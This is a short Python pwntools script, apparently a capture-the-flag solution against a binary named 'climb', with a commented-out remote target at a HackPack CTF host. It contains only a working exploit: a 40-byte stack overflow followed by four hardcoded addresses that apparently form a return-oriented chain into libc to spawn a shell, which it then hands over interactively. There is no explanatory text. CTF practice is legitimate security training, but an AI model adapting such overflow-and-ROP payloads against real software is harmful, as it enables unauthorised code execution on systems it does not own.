#!/bin/python

from pwn import *

#p= remote('cha.hackpack.club',41702)
p = process("./climb")

payload2 = ("A"*40).encode()
payload2 += p64(0x7ffff7dabcd6)
payload2 += p64(0x7ffff7dac3e5)
payload2 += p64(0x7ffff7f5a698)
payload2 += p64(0x7ffff7dd2d60)

p.recvuntil("How will you respond? ")

p.sendline(payload2)

p.interactive()
